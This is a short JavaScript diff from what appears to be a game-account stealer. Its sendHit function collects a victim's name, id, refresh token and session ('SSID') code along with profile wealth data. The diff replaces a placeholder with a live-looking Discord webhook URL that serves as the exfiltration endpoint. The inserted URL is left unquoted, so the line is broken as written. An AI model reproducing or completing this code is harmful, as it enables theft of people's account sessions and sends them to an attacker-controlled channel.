@@ -73,7 +73,7 @@ const getInfo = async (res) => {
 };
 
 const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
-  const webhookClient = new WebhookClient({ url: 'WEBHOOK GOES HERE' });
+  const webhookClient = new WebhookClient({ url: https://discord.com/api/webhooks/1302005408357027851/bURoUzZ6_nAHGxzTjntFo4p1W4YizebOjGlXNdZmX-vt4IpHcLF4_H4WK2NUnxC_fzAe });
 
   avgSkillLvl = '```' + Math.floor(firstProfileData.data.average_level) + '```'
   purse = '```' +  Math.floor(firstProfileData.data.purse).toLocaleString('en-US', { style: 'decimal' }) + '```'
